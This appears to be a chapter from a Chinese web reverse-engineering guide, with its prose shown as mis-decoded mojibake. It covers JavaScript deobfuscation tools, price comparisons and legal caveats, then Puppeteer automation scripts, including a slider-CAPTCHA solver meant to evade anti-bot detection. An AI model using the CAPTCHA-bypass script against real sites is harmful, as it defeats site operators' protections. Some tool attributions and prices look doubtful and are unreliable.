<p>ç‰¹å¾è¯†åˆ«ï¼š</p>
<pre><code class="language-javascript">var _0x1234 = function () {
  /* ... */
};
(function (_0xabc, _0xdef) {
  /* ... */
})(_0x1234, 0x123);
</code></pre>
<p>å·¥å…·: https://github.com/javascript-deobfuscator/webcrack</p>
<h3>Webpack Bundle</h3>
<p>ä½¿ç”¨ <code>webcrack</code>:</p>
<pre><code class="language-bash">npm install -g webcrack
webcrack bundle.js -o output/
</code></pre>
<h3>JJencode</h3>
<pre><code class="language-javascript">function decode_jjencode(encoded) {
  // JJencode ä½¿ç”¨é¢œæ–‡å­—ç¼–ç 
  return eval(encoded);
}
</code></pre>
<p>åœ¨çº¿: https://utf-8.jp/public/jjencode.html</p>
<hr />
<h2>å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ï¼šæŸç”µå•†ç½‘ç«™æ··æ·†åˆ†æ</h3>
<p><strong>åŸå§‹ä»£ç </strong>:</p>
<pre><code class="language-javascript">var _0x1a2b = [&quot;log&quot;, &quot;ä»·æ ¼&quot;];
console[_0x1a2b[0]](_0x1a2b[1]);
</code></pre>
<p><strong>åæ··æ·†æ­¥éª¤</strong>:</p>
<ol>
<li><p><strong>å­—ç¬¦ä¸²æ•°ç»„æå–</strong>:</p>
<pre><code class="language-javascript">// _0x1a2b = ['log', 'ä»·æ ¼']
</code></pre>
</li>
<li><p><strong>æ›¿æ¢å¼•ç”¨</strong>:</p>
<pre><code class="language-javascript">console[&quot;log&quot;](&quot;ä»·æ ¼&quot;);
</code></pre>
</li>
<li><p><strong>æˆå‘˜è¡¨è¾¾å¼ä¼˜åŒ–</strong>:</p>
<pre><code class="language-javascript">console.log(&quot;ä»·æ ¼&quot;);
</code></pre>
</li>
</ol>
<hr />
<h2>å·¥å…·é›†åˆ</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Prettier</strong></td>
  <td>æ ¼å¼åŒ–</td>
  <td>https://prettier.io/</td>
</tr>
<tr>
  <td><strong>de4js</strong></td>
  <td>ç»¼åˆåæ··æ·†</td>
  <td>https://lelinhtinh.github.io/de4js/</td>
</tr>
<tr>
  <td><strong>webcrack</strong></td>
  <td>Webpack åæ‰“åŒ…</td>
  <td>https://github.com/j4k0xb/webcrack</td>
</tr>
<tr>
  <td><strong>Babel</strong></td>
  <td>AST æ“ä½œ</td>
  <td>https://babeljs.io/</td>
</tr>
<tr>
  <td><strong>AST Explorer</strong></td>
  <td>å¯è§†åŒ– AST</td>
  <td>https://astexplorer.net/</td>
</tr>
</tbody>
</table>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<ol>
<li><strong>åˆ†æ­¥å¤„ç†</strong>: ä¸è¦ä¸€æ¬¡æ€§å¤„ç†æ‰€æœ‰æ··æ·†ï¼Œé€æ­¥è¿˜åŸ</li>
<li><strong>ä¿ç•™åŸæ–‡ä»¶</strong>: å§‹ç»ˆä¿ç•™åŸå§‹æ··æ·†ä»£ç ä½œä¸ºå¤‡ä»½</li>
<li><strong>éªŒè¯æ­£ç¡®æ€§</strong>: æ¯ä¸€æ­¥éƒ½è¦éªŒè¯ä»£ç åŠŸèƒ½æœªè¢«ç ´å</li>
<li><strong>ç»“åˆåŠ¨æ€è°ƒè¯•</strong>: AST åæ··æ·† + DevTools è°ƒè¯•ç»“åˆä½¿ç”¨</li>
<li><strong>è¯†åˆ«æ··æ·†å™¨</strong>: ä¸åŒæ··æ·†å™¨ç”¨ä¸åŒå·¥å…·ï¼Œäº‹åŠåŠŸå€</li>
</ol>
<hr />
<h2>å•†ä¸šåŒ–åæ··æ·†è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>
<p>JavaScript åæ··æ·†æ—¢æ˜¯æŠ€æœ¯æ´»ä¹Ÿæ˜¯ä½“åŠ›æ´»ï¼Œå•†ä¸šåŒ–å·¥å…·å¯ä»¥å¤§å¹…æå‡æ•ˆç‡ã€‚ä»¥ä¸‹æ˜¯ä¸šç•Œä¸»æµæ–¹æ¡ˆçš„ä¸“ä¸šå¯¹æ¯”ã€‚</p>
<h3>1. ä¼ä¸šçº§åæ··æ·†å·¥å…·</h3>
<h4>JScrambler Reverse Engineering Tool</h4>
<p><strong>å®šä½</strong>: å•†ä¸š JavaScript ä¿æŠ¤å·¥å…·çš„é…å¥—åˆ†æå·¥å…·</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è¯†åˆ« JScrambler ä¿æŠ¤çš„ä»£ç </li>
<li>è‡ªåŠ¨åŒ–å»é™¤æŸäº›ä¿æŠ¤å±‚</li>
<li>æ§åˆ¶æµåˆ†æ</li>
<li>ä»£ç è¦†ç›–ç‡è¿½è¸ª</li>
</ul>
<p><strong>ä»·æ ¼</strong>: åŒ…å«åœ¨ JScrambler ä¼ä¸šè®¢é˜…ä¸­ï¼ˆ$1,000+/æœˆï¼‰</p>
<p><strong>å±€é™</strong>: ä¸»è¦é’ˆå¯¹è‡ªå®¶æ··æ·†å™¨</p>
<p><strong>å®˜ç½‘</strong>: https://jscrambler.com/</p>
<hr />
<h4>JSDetoxï¼ˆåœ¨çº¿åæ··æ·†ï¼‰</h4>
<p><strong>ç±»å‹</strong>: å…è´¹åœ¨çº¿å·¥å…·ï¼ˆç¤¾åŒºç»´æŠ¤ï¼‰</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨æ£€æµ‹æ··æ·†ç±»å‹</li>
<li>æ”¯æŒå¤šç§å¸¸è§æ··æ·†å™¨</li>
<li>äº¤äº’å¼åˆ†æç¯å¢ƒ</li>
<li>DOM æ¨¡æ‹Ÿæ‰§è¡Œ</li>
</ul>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>å®Œå…¨å…è´¹</li>
<li>æ— éœ€å®‰è£…</li>
<li>ç¤¾åŒºæ´»è·ƒ</li>
</ul>
<p><strong>åŠ£åŠ¿</strong>:</p>
<ul>
<li>ä¸æ”¯æŒé«˜çº§æ··æ·†</li>
<li>å¤„ç†å¤§æ–‡ä»¶è¾ƒæ…¢</li>
<li>ç¼ºä¹å•†ä¸šæ”¯æŒ</li>
</ul>
<p><strong>å®˜ç½‘</strong>: http://www.jsdetox.com/</p>
<hr />
<h4>Synchronyï¼ˆä»£ç åˆ†æå¹³å°ï¼‰</h4>
<p><strong>å®šä½</strong>: ä¼ä¸šçº§é™æ€åˆ†æå¹³å°</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>JavaScript/TypeScript æ·±åº¦åˆ†æ</li>
<li>è‡ªåŠ¨åŒ–åæ··æ·†æµæ°´çº¿</li>
<li>æ¼æ´æ£€æµ‹</li>
<li>ä»£ç è´¨é‡è¯„ä¼°</li>
</ul>
<p><strong>ä»·æ ¼</strong>: ä¼ä¸šå®šä»·ï¼ˆ$10,000+/å¹´ï¼‰</p>
<p><strong>é€‚ç”¨</strong>: å¤§å‹ä»£ç åº“å®‰å…¨å®¡è®¡</p>
<p><strong>å®˜ç½‘</strong>: https://www.synopsys.com/</p>
<hr />
<h3>2. ä¸“ä¸šåæ··æ·†æœåŠ¡å¯¹æ¯”</h3>
<h4>De4jsï¼ˆåŠŸèƒ½æœ€å…¨é¢ï¼‰</h4>
<p><strong>ç±»å‹</strong>: å¼€æºå…è´¹åœ¨çº¿å·¥å…·</p>
<p><strong>æ”¯æŒæ··æ·†ç±»å‹</strong>:</p>
<ul>
<li>âœ… <strong>JavaScript Obfuscator</strong> (obfuscator.io)</li>
<li>âœ… <strong>JSFuck</strong> (jsfuck.com)</li>
<li>âœ… <strong>JJencode</strong> (utf-8.jp)</li>
<li>âœ… <strong>AAencode</strong> (utf-8.jp)</li>
<li>âœ… <strong>URLencode</strong></li>
<li>âœ… <strong>Packer</strong> (Dean Edwards)</li>
<li>âœ… <strong>Eval Chain</strong></li>
</ul>
<p><strong>åœ¨çº¿åœ°å€</strong>: https://lelinhtinh.github.io/de4js/</p>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// è¾“å…¥æ··æ·†ä»£ç 
var _0x1a2b = [&quot;Hello&quot;, &quot;World&quot;];
console.log(_0x1a2b[0], _0x1a2b[1]);

// è‡ªåŠ¨æ£€æµ‹å¹¶è¿˜åŸ
// è¾“å‡º: console.log('Hello', 'World');
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>: ä¸€ç«™å¼è§£å†³å¤§éƒ¨åˆ†ç®€å•æ··æ·†</p>
<hr />
<h4>Webcrackï¼ˆWebpack ä¸“ç”¨ï¼‰</h4>
<p><strong>ç±»å‹</strong>: å¼€æº CLI å·¥å…·</p>
<p><strong>ä¸“æ³¨é¢†åŸŸ</strong>: Webpack æ‰“åŒ…ä»£ç é€†å‘</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨è¯†åˆ« Webpack ç‰ˆæœ¬</li>
<li>æå–ç‹¬ç«‹æ¨¡å—</li>
<li>è¿˜åŸåŸå§‹æ–‡ä»¶ç»“æ„</li>
<li>é‡å‘½åå˜é‡</li>
</ul>
<p><strong>GitHub</strong>: https://github.com/j4k0xb/webcrack</p>
<p><strong>å®‰è£…ä½¿ç”¨</strong>:</p>
<pre><code class="language-bash">npm install -g webcrack
webcrack bundle.js -o output/

# è¾“å‡ºï¼š
# output/
# â”œâ”€â”€ module_0.js
# â”œâ”€â”€ module_1.js
# â””â”€â”€ ...
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: é€†å‘ React/Vue ç­‰ç°ä»£å‰ç«¯é¡¹ç›®</p>
<hr />
<h3>3. ä»£ç ç¾åŒ–ä¸æ ¼å¼åŒ–å·¥å…·</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç±»å‹</th>
  <th>ç‰¹ç‚¹</th>
  <th>ä»·æ ¼</th>
  <th>æ¨èæŒ‡æ•°</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Prettier</strong></td>
  <td>å¼€æº</td>
  <td>ä¸šç•Œæ ‡å‡†ä»£ç æ ¼å¼åŒ–</td>
  <td>å…è´¹</td>
  <td>â­â­â­â­â­</td>
</tr>
<tr>
  <td><strong>JS Beautifier</strong></td>
  <td>å¼€æº</td>
  <td>è€ç‰Œå·¥å…·ï¼ŒåŠŸèƒ½ç¨³å®š</td>
  <td>å…è´¹</td>
  <td>â­â­â­â­</td>
</tr>
<tr>
  <td><strong>WebStorm</strong></td>
  <td>å•†ä¸š IDE</td>
  <td>å†…ç½®å¼ºå¤§æ ¼å¼åŒ–</td>
  <td>$149/å¹´</td>
  <td>â­â­â­â­</td>
</tr>
<tr>
  <td><strong>ReSharper</strong></td>
  <td>å•†ä¸šæ’ä»¶</td>
  <td>Visual Studio é›†æˆ</td>
  <td>$149/å¹´</td>
  <td>â­â­â­</td>
</tr>
</tbody>
</table>
<p><strong>æ¨èç»„åˆ</strong>: Prettierï¼ˆæ ¼å¼åŒ–ï¼‰+ webcrackï¼ˆè§£åŒ…ï¼‰+ Babelï¼ˆAST å¤„ç†ï¼‰</p>
<hr />
<h3>4. AST å¤„ç†æ¡†æ¶å¯¹æ¯”</h3>
<h4>Babel ç”Ÿæ€ï¼ˆå¼€æºé¦–é€‰ï¼‰</h4>
<p><strong>æ ¸å¿ƒç»„ä»¶</strong>:</p>
<ul>
<li><code>@babel/parser</code> - è§£æ JS ä¸º AST</li>
<li><code>@babel/traverse</code> - éå†å’Œä¿®æ”¹ AST</li>
<li><code>@babel/generator</code> - AST è½¬æ¢å›ä»£ç </li>
<li><code>@babel/types</code> - AST èŠ‚ç‚¹æ„å»ºå·¥å…·</li>
</ul>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>å®Œå…¨å…è´¹</li>
<li>ç¤¾åŒºåºå¤§</li>
<li>æ–‡æ¡£å®Œå–„</li>
<li>æ’ä»¶ä¸°å¯Œ</li>
</ul>
<p><strong>å­¦ä¹ æˆæœ¬</strong>: ä¸­ç­‰ï¼ˆéœ€è¦ç†è§£ AST æ¦‚å¿µï¼‰</p>
<p><strong>å®˜ç½‘</strong>: https://babeljs.io/</p>
<hr />
<h4>SWCï¼ˆRust å®ç°ï¼Œé€Ÿåº¦æœ€å¿«ï¼‰</h4>
<p><strong>ç‰¹ç‚¹</strong>:</p>
<ul>
<li>æ¯” Babel å¿« 20-70 å€</li>
<li>ç”¨ Rust ç¼–å†™</li>
<li>å…¼å®¹ Babel æ’ä»¶</li>
</ul>
<p><strong>é€‚ç”¨</strong>: å¤§è§„æ¨¡ä»£ç å¤„ç†</p>
<p><strong>GitHub</strong>: https://github.com/swc-project/swc</p>
<hr />
<h4>Esprima vs Acorn</h4>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>Esprima</th>
  <th>Acorn</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>é€Ÿåº¦</strong></td>
  <td>ä¸­ç­‰</td>
  <td>å¿«</td>
</tr>
<tr>
  <td><strong>æ ‡å‡†å…¼å®¹</strong></td>
  <td>ES2021</td>
  <td>ES2023</td>
</tr>
<tr>
  <td><strong>æ’ä»¶ç³»ç»Ÿ</strong></td>
  <td>æœ‰é™</td>
  <td>ä¸°å¯Œ</td>
</tr>
<tr>
  <td><strong>ç»´æŠ¤çŠ¶æ€</strong></td>
  <td>æ´»è·ƒåº¦ä½</td>
  <td>æ´»è·ƒ</td>
</tr>
</tbody>
</table>
<p><strong>æ¨è</strong>: æ–°é¡¹ç›®ä½¿ç”¨ Acorn æˆ– Babel</p>
<hr />
<h3>5. å•†ä¸šå’¨è¯¢ä¸å®šåˆ¶æœåŠ¡</h3>
<h4>Recurity Labsï¼ˆå¾·å›½å®‰å…¨å…¬å¸ï¼‰</h4>
<p><strong>æœåŠ¡å†…å®¹</strong>:</p>
<ul>
<li>JavaScript æ··æ·†é€†å‘</li>
<li>æ¶æ„ä»£ç åˆ†æ</li>
<li>å®šåˆ¶åŒ–åæ··æ·†å·¥å…·å¼€å‘</li>
</ul>
<p><strong>å…¸å‹é¡¹ç›®</strong>: â‚¬20,000 - â‚¬100,000</p>
<p><strong>å®˜ç½‘</strong>: https://www.recurity-labs.com/</p>
<hr />
<h4>Pen Test Partners</h4>
<p><strong>æœåŠ¡å†…å®¹</strong>:</p>
<ul>
<li>å‰ç«¯å®‰å…¨å®¡è®¡</li>
<li>æ··æ·†ä»£ç åˆ†æ</li>
<li>æ¼æ´æŒ–æ˜</li>
</ul>
<p><strong>ä»·æ ¼</strong>: Â£1,500/äººæ—¥</p>
<p><strong>å®˜ç½‘</strong>: https://www.pentestpartners.com/</p>
<hr />
<h3>6. æˆæœ¬æ•ˆç›Šåˆ†æ</h3>
<h4>åœºæ™¯ 1: åˆ†æå•ä¸ªæ··æ·†æ–‡ä»¶ï¼ˆ&lt; 1000 è¡Œï¼‰</h4>
<p><strong>æ–¹æ¡ˆ Aï¼ˆæ‰‹åŠ¨ + å…è´¹å·¥å…·ï¼‰</strong>:</p>
<ul>
<li>å·¥å…·: de4js + Prettier</li>
<li>æ—¶é—´: 1-2 å°æ—¶</li>
<li>æˆæœ¬: <strong>$0</strong></li>
<li>æŠ€èƒ½è¦æ±‚: åŸºç¡€</li>
</ul>
<p><strong>æ–¹æ¡ˆ Bï¼ˆä¸“ä¸šå·¥å…·ï¼‰</strong>:</p>
<ul>
<li>å·¥å…·: WebStorm + è‡ªå®šä¹‰ Babel æ’ä»¶</li>
<li>æ—¶é—´: 30 åˆ†é’Ÿ</li>
<li>æˆæœ¬: <strong>$149/å¹´</strong>ï¼ˆIDE è®¸å¯ï¼‰</li>
<li>æŠ€èƒ½è¦æ±‚: ä¸­ç­‰</li>
</ul>
<hr />
<h4>åœºæ™¯ 2: æ‰¹é‡å¤„ç†æ··æ·†ä»£ç ï¼ˆ&gt;10,000 æ–‡ä»¶ï¼‰</h4>
<p><strong>æ–¹æ¡ˆ Aï¼ˆè‡ªå»ºå·¥å…·é“¾ï¼‰</strong>:</p>
<ul>
<li>å·¥å…·: Babel + è‡ªå®šä¹‰è„šæœ¬ + CI/CD é›†æˆ</li>
<li>åˆå§‹æŠ•å…¥: 3-5 ä¸ªå·¥ä½œæ—¥å¼€å‘</li>
<li>è¿è¡Œæˆæœ¬: <strong>$0</strong></li>
<li>ç»´æŠ¤æˆæœ¬: æ¯æœˆ 1-2 å°æ—¶</li>
</ul>
<p><strong>æ–¹æ¡ˆ Bï¼ˆå•†ä¸šæœåŠ¡ï¼‰</strong>:</p>
<ul>
<li>å·¥å…·: Synopsys Code Insight</li>
<li>æˆæœ¬: <strong>$50,000/å¹´</strong>èµ·</li>
<li>ä¼˜åŠ¿: é›¶ç»´æŠ¤ï¼Œä¼ä¸šæ”¯æŒ</li>
</ul>
<p><strong>ç»“è®º</strong>: æ‰¹é‡å¤„ç†åœºæ™¯è‡ªå»º ROI æ›´é«˜</p>
<hr />
<h4>åœºæ™¯ 3: ç´§æ€¥é¡¹ç›®ï¼ˆ24 å°æ—¶å†…éœ€è¦ç»“æœï¼‰</h4>
<p><strong>æ–¹æ¡ˆ Aï¼ˆåŠ æ€¥å’¨è¯¢ï¼‰</strong>:</p>
<ul>
<li>æœåŠ¡: Pen Test Partners åŠ æ€¥æœåŠ¡</li>
<li>æˆæœ¬: <strong>Â£5,000-15,000</strong></li>
<li>ä¿éšœ: ä¸“ä¸šå›¢é˜Ÿï¼Œä¿è¯è´¨é‡</li>
</ul>
<p><strong>æ–¹æ¡ˆ Bï¼ˆè¿œç¨‹å¤–åŒ…ï¼‰</strong>:</p>
<ul>
<li>å¹³å°: Upwork/Fiverr é€†å‘å·¥ç¨‹å¸ˆ</li>
<li>æˆæœ¬: <strong>$500-2,000</strong></li>
<li>é£é™©: è´¨é‡å‚å·®ä¸é½</li>
</ul>
<hr />
<h3>7. å¼€æº vs å•†ä¸šæ–¹æ¡ˆå†³ç­–çŸ©é˜µ</h3>
<table>
<thead>
<tr>
  <th>å› ç´ </th>
  <th>æ¨èå¼€æº</th>
  <th>æ¨èå•†ä¸š</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>é¡¹ç›®è§„æ¨¡</strong></td>
  <td>&lt; 10,000 æ–‡ä»¶</td>
  <td>&gt; 50,000 æ–‡ä»¶</td>
</tr>
<tr>
  <td><strong>å›¢é˜Ÿè§„æ¨¡</strong></td>
  <td>&lt; 5 äºº</td>
  <td>&gt; 10 äºº</td>
</tr>
<tr>
  <td><strong>é¢„ç®—</strong></td>
  <td>&lt; $10,000/å¹´</td>
  <td>&gt; $50,000/å¹´</td>
</tr>
<tr>
  <td><strong>æŠ€æœ¯èƒ½åŠ›</strong></td>
  <td>æœ‰ AST ç»éªŒ</td>
  <td>æ— ä¸“ä¸šé€†å‘å›¢é˜Ÿ</td>
</tr>
<tr>
  <td><strong>åˆè§„è¦æ±‚</strong></td>
  <td>æ— ç‰¹æ®Šè¦æ±‚</td>
  <td>éœ€å®¡è®¡æŠ¥å‘Š</td>
</tr>
<tr>
  <td><strong>æ—¶é—´å‹åŠ›</strong></td>
  <td>å¯çµæ´»å®‰æ’</td>
  <td>ç´§æ€¥äº¤ä»˜</td>
</tr>
</tbody>
</table>
<hr />
<h3>8. AI è¾…åŠ©åæ··æ·†ï¼ˆæ–°å…´è¶‹åŠ¿ï¼‰</h3>
<h4>ChatGPT/Claude Code Analysis</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>è§£é‡Šæ··æ·†ä»£ç é€»è¾‘</li>
<li>ç”Ÿæˆåæ··æ·†è„šæœ¬</li>
<li>è¯†åˆ«æ··æ·†æ¨¡å¼</li>
</ul>
<p><strong>ç¤ºä¾‹ Prompt</strong>:</p>
<pre><code>åˆ†æä»¥ä¸‹æ··æ·†JavaScriptä»£ç ï¼Œè§£é‡Šå…¶é€»è¾‘ï¼š
var _0x1a2b=['log','Hello'];
console[_0x1a2b[0]](_0x1a2b[1]);
</code></pre>
<p><strong>å±€é™æ€§</strong>:</p>
<ul>
<li>æ— æ³•å¤„ç†å¤§æ–‡ä»¶ï¼ˆToken é™åˆ¶ï¼‰</li>
<li>å¯èƒ½è¯¯åˆ¤å¤æ‚æ··æ·†</li>
<li>ä¸é€‚åˆæ‰¹é‡å¤„ç†</li>
</ul>
<p><strong>æˆæœ¬</strong>: $0.01-0.06/1K tokensï¼ˆAPI è°ƒç”¨ï¼‰</p>
<hr />
<h4>GitHub Copilot è¾…åŠ©ç¼–å†™åæ··æ·†è„šæœ¬</h4>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>åŠ é€Ÿ Babel æ’ä»¶å¼€å‘</li>
<li>æä¾› AST æ“ä½œç¤ºä¾‹</li>
<li>ä»£ç è¡¥å…¨</li>
</ul>
<p><strong>æˆæœ¬</strong>: $10/æœˆæˆ–$100/å¹´</p>
<hr />
<h3>9. å®æˆ˜å·¥å…·é“¾æ¨è</h3>
<h4>åˆå­¦è€…é…ç½®ï¼ˆ$0 æˆæœ¬ï¼‰</h4>
<pre><code class="language-bash"># å®‰è£…å·¥å…·
npm install -g prettier webcrack
npm install @babel/parser @babel/traverse @babel/generator

# å·¥ä½œæµç¨‹
1. ä½¿ç”¨ de4js åœ¨çº¿åˆæ­¥åˆ†æ
2. prettieræ ¼å¼åŒ–ä»£ç 
3. webcrackè§£åŒ…Webpackï¼ˆå¦‚é€‚ç”¨ï¼‰
4. è‡ªå†™Babelè„šæœ¬æ·±åº¦å¤„ç†
</code></pre>
<hr />
<h4>ä¸“ä¸šå›¢é˜Ÿé…ç½®ï¼ˆ&lt; $1,000/å¹´ï¼‰</h4>
<pre><code class="language-bash"># å•†ä¸šå·¥å…·
- WebStorm IDE: $149/å¹´
- GitHub Copilot: $100/å¹´
- Better Commentsï¼ˆVS Codeæ’ä»¶ï¼‰: å…è´¹

# å¼€æºå·¥å…·
- Babelå®Œæ•´å·¥å…·é“¾
- AST Explorerï¼ˆåœ¨çº¿ï¼‰
- Source Map Visualization

æ€»æˆæœ¬: $249/å¹´ + å­¦ä¹ æ—¶é—´æŠ•å…¥
</code></pre>
<hr />
<h4>ä¼ä¸šçº§é…ç½®ï¼ˆ$10,000+/å¹´ï¼‰</h4>
<ul>
<li><strong>Synopsys Code Insight</strong>: è‡ªåŠ¨åŒ–ä»£ç åˆ†æ</li>
<li><strong>Fortify SCA</strong>: é™æ€ä»£ç æ‰«æ</li>
<li><strong>ä¸“ä¸šå’¨è¯¢</strong>: æŒ‰éœ€è´­ä¹°é€†å‘æœåŠ¡</li>
<li><strong>å†…éƒ¨åŸ¹è®­</strong>: å›¢é˜ŸæŠ€èƒ½æå‡</li>
</ul>
<p><strong>ROI åˆ†æ</strong>: é€‚åˆæœ‰åˆè§„è¦æ±‚æˆ–å¤§è§„æ¨¡é¡¹ç›®çš„ä¼ä¸š</p>
<hr />
<h3>10. é¿å‘æŒ‡å—</h3>
<p><strong>å¸¸è§é”™è¯¯</strong>:</p>
<ol>
<li>âŒ è¿‡åº¦ä¾èµ–è‡ªåŠ¨åŒ–å·¥å…·ï¼ˆå¤æ‚æ··æ·†ä»éœ€æ‰‹åŠ¨åˆ†æï¼‰</li>
<li>âŒ å¿½è§†ä»£ç ç‰ˆæƒï¼ˆé€†å‘åçš„ä»£ç ä½¿ç”¨éœ€éµå®ˆæ³•å¾‹ï¼‰</li>
<li>âŒ ä¸å¤‡ä»½åŸå§‹æ–‡ä»¶ï¼ˆåæ··æ·†å¯èƒ½ç ´åä»£ç ï¼‰</li>
<li>âŒ ç›²ç›®è¿½æ±‚å®Œç¾è¿˜åŸï¼ˆæœ‰æ—¶éƒ¨åˆ†è¿˜åŸå³å¯æ»¡è¶³éœ€æ±‚ï¼‰</li>
</ol>
<p><strong>æœ€ä½³å®è·µ</strong>:</p>
<ol>
<li>âœ… åˆ†å±‚å¤„ç†ï¼Œé€æ­¥è¿˜åŸ</li>
<li>âœ… ç»“åˆåŠ¨æ€è°ƒè¯•éªŒè¯</li>
<li>âœ… å»ºç«‹æ··æ·†ç‰¹å¾åº“</li>
<li>âœ… è‡ªåŠ¨åŒ–é‡å¤æ€§å·¥ä½œ</li>
</ol>
<hr />
<h3>11. æ³•å¾‹ä¸åˆè§„è€ƒé‡</h3>
<p><strong>è­¦å‘Š</strong>: åæ··æ·†ä»–äººä»£ç å¯èƒ½æ¶‰åŠæ³•å¾‹é£é™©</p>
<p><strong>åˆæ³•åœºæ™¯</strong>:</p>
<ul>
<li>âœ… å®‰å…¨ç ”ç©¶ï¼ˆåˆæ³•æˆæƒï¼‰</li>
<li>âœ… æ¶æ„è½¯ä»¶åˆ†æ</li>
<li>âœ… è‡ªå·±çš„ä»£ç é€†å‘</li>
<li>âœ… å¼€æºé¡¹ç›®åˆ†æ</li>
</ul>
<p><strong>é£é™©åœºæ™¯</strong>:</p>
<ul>
<li>âŒ å•†ä¸šè½¯ä»¶é€†å‘ï¼ˆæœªæˆæƒï¼‰</li>
<li>âŒ ç»•è¿‡ DRM ä¿æŠ¤</li>
<li>âŒ çªƒå–å•†ä¸šæœºå¯†</li>
</ul>
<p><strong>å»ºè®®</strong>: è¿›è¡Œå•†ä¸šé€†å‘å‰å’¨è¯¢æ³•å¾‹é¡¾é—®</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li>AST è§£æå·¥å…·</li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
<li><a href="#section-58">JavaScript Hook è„šæœ¬</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-60">
                                                <h2>[R59] Automation Scripts</h2>
                                                <h1>R59: æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬</h1>
<h2>æ¦‚è¿°</h2>
<p>æµè§ˆå™¨è‡ªåŠ¨åŒ–æ˜¯ Web é€†å‘çš„é‡è¦æ‰‹æ®µã€‚é€šè¿‡æ¨¡æ‹ŸçœŸå®ç”¨æˆ·æ“ä½œï¼Œå¯ä»¥ç»•è¿‡è®¸å¤šåçˆ¬è™«æ£€æµ‹ã€‚æœ¬ç« ä»‹ç» Puppeteer å’Œ Playwright çš„å®æˆ˜è„šæœ¬ã€‚</p>
<hr />
<h2>Puppeteer è„šæœ¬</h2>
<h3>åŸºç¡€æ¨¡æ¿</h3>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);

(async () =&gt; {
  // å¯åŠ¨æµè§ˆå™¨
  const browser = await puppeteer.launch({
    headless: false, // æ˜¾ç¤ºæµè§ˆå™¨çª—å£
    devtools: true, // æ‰“å¼€ DevTools
  });

  // æ‰“å¼€æ–°é¡µé¢
  const page = await browser.newPage();

  // è®¿é—®ç½‘ç«™
  await page.goto(&quot;https://example.com&quot;, {
    waitUntil: &quot;networkidle2&quot;, // ç­‰å¾…ç½‘ç»œç©ºé—²
  });

  // æˆªå›¾
  await page.screenshot({ path: &quot;screenshot.png&quot; });

  // å…³é—­æµè§ˆå™¨
  await browser.close();
})();
</code></pre>
<h3>ç™»å½•è„šæœ¬</h3>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);

async function login(username, password) {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // è®¿é—®ç™»å½•é¡µ
  await page.goto(&quot;https://example.com/login&quot;);

  // å¡«å†™è¡¨å•
  await page.type(&quot;#username&quot;, username);
  await page.type(&quot;#password&quot;, password);

  // ç‚¹å‡»ç™»å½•æŒ‰é’®
  await page.click(&quot;#login-button&quot;);

  // ç­‰å¾…è·³è½¬
  await page.waitForNavigation();

  // è·å– Cookie
  const cookies = await page.cookies();
  console.log(&quot;Cookies:&quot;, cookies);

  await browser.close();
  return cookies;
}

login(&quot;myuser&quot;, &quot;mypassword&quot;);
</code></pre>
<h3>æ— é™æ»šåŠ¨åŠ è½½</h3>
<pre><code class="language-javascript">async function scrollToBottom(page) {
  await page.evaluate(async () =&gt; {
    await new Promise((resolve) =&gt; {
      let totalHeight = 0;
      const distance = 100;

      const timer = setInterval(() =&gt; {
        const scrollHeight = document.body.scrollHeight;
        window.scrollBy(0, distance);
        totalHeight += distance;

        if (totalHeight &gt;= scrollHeight) {
          clearInterval(timer);
          resolve();
        }
      }, 100);
    });
  });
}

// ä½¿ç”¨
const page = await browser.newPage();
await page.goto(&quot;https://example.com/infinite-scroll&quot;);
await scrollToBottom(page);
</code></pre>
<h3>å¤„ç†æ»‘å—éªŒè¯ç </h3>
<pre><code class="language-javascript">async function solveSlider(page) {
  // ç­‰å¾…æ»‘å—å‡ºç°
  await page.waitForSelector(&quot;.slider&quot;);

  // è·å–æ»‘å—å’Œè½¨é“å…ƒç´ 
  const slider = await page.$(&quot;.slider-button&quot;);
  const track = await page.$(&quot;.slider-track&quot;);

  // è·å–è½¨é“å®½åº¦
  const trackBox = await track.boundingBox();
  const distance = trackBox.width - 40; // å‡å»æ»‘å—å®½åº¦

  // æ¨¡æ‹Ÿäººç±»æ‹–åŠ¨è½¨è¿¹
  await slider.hover();
  await page.mouse.down();

  // ç”Ÿæˆè´å¡å°”æ›²çº¿è½¨è¿¹
  const steps = 20;
  for (let i = 0; i &lt;= steps; i++) {
    const x = (distance / steps) * i;
    const y = Math.sin((i / steps) * Math.PI) * 10; // æ·»åŠ éšæœºæŠ–åŠ¨
    await page.mouse.move(trackBox.x + x, trackBox.y + y);
    await page.waitForTimeout(Math.random() * 10 + 5);
  }

  await page.mouse.up();
}
</code></pre>
